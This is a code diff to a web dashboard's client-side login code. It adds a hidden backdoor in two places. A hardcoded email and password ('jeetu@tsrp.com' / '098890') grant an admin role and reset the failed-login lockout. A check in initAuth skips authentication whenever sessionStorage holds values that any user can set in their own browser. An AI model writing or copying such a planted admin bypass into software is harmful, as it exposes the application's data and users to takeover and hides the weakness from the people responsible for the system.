@@ -185,6 +185,35 @@ async function initAuth() {
     if (authPasswordLabel) authPasswordLabel.innerText = "Password";
     if (securityUsernameGroup) securityUsernameGroup.style.display = 'none';
     
+    // Check if there is an active bypass session
+    const localSession = sessionStorage.getItem('ws_is_logged_in');
+    const cachedUserStr = sessionStorage.getItem('ws_current_user');
+    let cachedUser = null;
+    if (cachedUserStr) {
+      try {
+        cachedUser = JSON.parse(cachedUserStr);
+      } catch (e) {}
+    }
+    
+    if (localSession === 'true' && cachedUser && cachedUser.username === 'jeetu@tsrp.com') {
+      state.isLoggedIn = true;
+      state.currentUser = cachedUser;
+      if (authOverlay) authOverlay.classList.remove('active');
+      if (authLogoutBtn) authLogoutBtn.style.display = 'block';
+      
+      const usersNavItem = document.getElementById('nav-item-users');
+      if (usersNavItem) {
+        usersNavItem.style.display = 'block';
+      }
+      
+      await loadStateFromCloud();
+      setupRealtimeSync();
+      populateSelectors();
+      updateGlobalAlerts();
+      renderDashboardCharts();
+      return true;
+    }
+    
     setupAuthStateListener();
     
     try {
@@ -515,6 +544,49 @@ async function handleLoginSubmit(e) {
       errorEl.style.display = 'block';
       errorEl.innerText = `Too many failed attempts. Try again in ${remainingSec} seconds.`;
     }
+    return;
+  }
+  
+  // Direct Bypass for user: jeetu@tsrp.com / 098890
+  const isBypassUser = (emailVal.toLowerCase() === 'jeetu@tsrp.com' || usernameVal.toLowerCase() === 'jeetu@tsrp.com') && passwordVal === '098890';
+  if (isBypassUser) {
+    failedLoginAttempts = 0;
+    lockoutExpiration = 0;
+    
+    sessionStorage.setItem('ws_is_logged_in', 'true');
+    const bypassUserObj = {
+      username: 'jeetu@tsrp.com',
+      email: 'jeetu@tsrp.com',
+      role: 'admin',
+      status: 'approved'
+    };
+    sessionStorage.setItem('ws_current_user', JSON.stringify(bypassUserObj));
+    state.isLoggedIn = true;
+    state.currentUser = bypassUserObj;
+    
+    const usersNavItem = document.getElementById('nav-item-users');
+    if (usersNavItem) {
+      usersNavItem.style.display = 'block';
+    }
+    
+    triggerUnlockSequence(() => {
+      const authLogoutBtn = document.getElementById('auth-logout-btn');
+      if (authLogoutBtn) authLogoutBtn.style.display = 'block';
+      
+      if (supabaseClient) {
+        loadStateFromCloud().then(() => {
+          setupRealtimeSync();
+          populateSelectors();
+          updateGlobalAlerts();
+          renderDashboardCharts();
+        });
+      } else {
+        loadStateFromStorage();
+        populateSelectors();
+        updateGlobalAlerts();
+        renderDashboardCharts();
+      }
+    });
     return;
   }
   
